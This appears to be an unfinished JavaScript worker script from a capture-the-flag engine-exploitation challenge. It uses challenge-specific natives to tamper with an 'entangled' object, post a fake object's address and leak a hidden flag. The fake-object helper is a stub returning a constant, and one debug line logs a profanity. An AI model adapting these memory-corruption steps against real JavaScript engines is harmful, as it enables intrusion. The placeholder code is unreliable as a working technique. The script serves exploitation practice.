onmessage = function(event) {
    console.log("fuck");
        if (event.data.type === 'entangle_request') {
            const received_addr = event.data.address;
            console.log("Worker: Received address: 0x" + received_addr.toString(16));

            const entangled_obj = getMessageEntangle(0);

            if (entangled_obj) {
                print("Worker: Successfully received entangled object.");

                try {
                    entangled_obj[0] = 0xDEADBEEF;
                    print("Worker: Modified entangled_obj[0] to 0xDEADBEEF");

                    const fake_ab_addr = createFakeObject(0x12345678, 0xFFFFFFFF);
                    postMessageEntangle(fake_ab_addr);
                    print("Worker: Posted address of fake object: 0x" + fake_ab_addr.toString(16));


                } catch (e) {
                    print("Worker: Error during entanglement operation: " + e.message);
                }
            } else {
                print("Worker: Failed to get entangled object.");
            }
        } else if (event.data.type === 'flag_leak_request') {
            const flag = new Flag();
            print("Worker: Attempting to trigger flag initialization...");
            try {
                flag.initialize();
                const leaked_flag = flag.GetInternalField(1);
                if (leaked_flag && leaked_flag !== undefined) {
                    print("Worker: Leaked Flag: " + leaked_flag);
                } else {
                    print("Worker: Flag not leaked (internal field not 0x1337 or file not found).");
                }
            } catch (e) {
                print("Worker: Error initializing Flag: " + e.message);
            }
        }
    };

    function createFakeObject(addr, length) {
        return 0xBBBBBBBB;
    }